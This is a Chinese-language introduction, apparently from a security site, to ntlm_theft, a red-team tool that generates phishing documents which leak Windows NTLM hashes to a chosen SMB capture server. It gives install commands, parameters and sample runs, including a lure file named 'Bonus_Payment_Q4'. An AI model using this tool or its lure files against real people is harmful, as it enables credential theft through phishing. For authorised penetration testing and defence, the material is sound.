![](https://image.3001.net/images/20211002/1633144817_6157cff138eca535eef84.png!small)

## 关于ntlm_theft

ntlm_theft是一款基于Python
3开发的开源工具，可以生成21种不同类型的哈希窃取文档。该工具适用于网络钓鱼攻击，可以用于支持外网SMB流量和内部网络环境之中。与基于宏的文档或利用漏洞的文档相比，这些文件类型的好处在于，所有的这些文件都是使用“预期功能”构建的。

## 使用场景

ntlm_theft主要针对渗透测试人员和红队研究人员设计，可以帮助研究人员对目标公司员工进行内部网络钓鱼，或大规模测试防病毒和电子邮件网关的安全性。如果外网防火墙上允许出站SMB访问，则它也可用于外部网络钓鱼。

## 工具依赖

ntlm_theft基于Python 3开发，因此我们需要在本地环境安装并配置好Python 3环境，并安装好xlsxwriter：

    
    
    pip3 install xlsxwriter

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/Greenwolf/ntlm_theft.git

## 工具参数

ntlm_theft的运行需要提供四个必要参数，一个输入格式，输入文件或目录，以及基础的运行模式：

    
    
    -g, --generate : 选择生成所有文件或指定文件类型
    
    -s, --server : SMB哈希捕捉服务器的IP地址
    
    -f, --filename : 不包含后缀的基础文件名，之后可以进行重命名

## 工具运行

下面给出的工具演示样例中，我们将使用ntlm_theft生成所有文件：

    
    
    # python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
    
    Created: test/test.scf (BROWSE)
    
    Created: test/test-(url).url (BROWSE)
    
    Created: test/test-(icon).url (BROWSE)
    
    Created: test/test.rtf (OPEN)
    
    Created: test/test-(stylesheet).xml (OPEN)
    
    Created: test/test-(fulldocx).xml (OPEN)
    
    Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
    
    Created: test/test-(includepicture).docx (OPEN)
    
    Created: test/test-(remotetempl*ate).docx (OPEN)
    
    Created: test/test-(frameset).docx (OPEN)
    
    Created: test/test.m3u (OPEN IN WINDOWS MEDIA PL*AYER ONLY)
    
    Created: test/test.asx (OPEN)
    
    Created: test/test.jnlp (OPEN)
    
    Created: test/test.application (DOWNLOAD AND OPEN)
    
    Created: test/test.pdf (OPEN AND ALLOW)
    
    Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
    
    Generation Complete.

![](https://image.3001.net/images/20211002/1633144862_6157d01eb41baa0f85a44.png!small)

在下面的工具使用样例中，我们将使用ntlm_theft仅生成现代文件：

    
    
    # python3 ntlm_theft.py -g modern -s 127.0.0.1 -f meeting
    
    Skipping SCF as it does not work on modern Windows
    
    Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
    
    Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
    
    Created: meeting/meeting.rtf (OPEN)
    
    Created: meeting/meeting-(stylesheet).xml (OPEN)
    
    Created: meeting/meeting-(fulldocx).xml (OPEN)
    
    Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
    
    Created: meeting/meeting-(includepicture).docx (OPEN)
    
    Created: meeting/meeting-(remotetempl*ate).docx (OPEN)
    
    Created: meeting/meeting-(frameset).docx (OPEN)
    
    Created: meeting/meeting-(externalcell).xlsx (OPEN)
    
    Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PL*AYER ONLY)
    
    Created: meeting/meeting.asx (OPEN)
    
    Created: meeting/meeting.jnlp (OPEN)
    
    Created: meeting/meeting.application (DOWNLOAD AND OPEN)
    
    Created: meeting/meeting.pdf (OPEN AND ALLOW)
    
    Skipping zoom as it does not work on the latest versions
    
    Skipping Autorun.inf as it does not work on modern Windows
    
    Skipping desktop.ini as it does not work on modern Windows
    
    Generation Complete.

在下面的工具使用样例中，我们将使用ntlm_theft仅生成一份xlsx文件：

    
    
    # python3 ntlm_theft.py -g xlsx -s 192.168.1.103 -f Bonus_Payment_Q4
    
    Created: Bonus_Payment_Q4/Bonus_Payment_Q4-(externalcell).xlsx (OPEN)
    
    Generation Complete.

## 工具运行截图

![](https://image.3001.net/images/20211002/1633144895_6157d03fb6f29c3ffbbd7.png!small)

## 项目地址

 **ntlm_theft：** 【[ _GitHub传送门_](https://github.com/Greenwolf/ntlm_theft)】

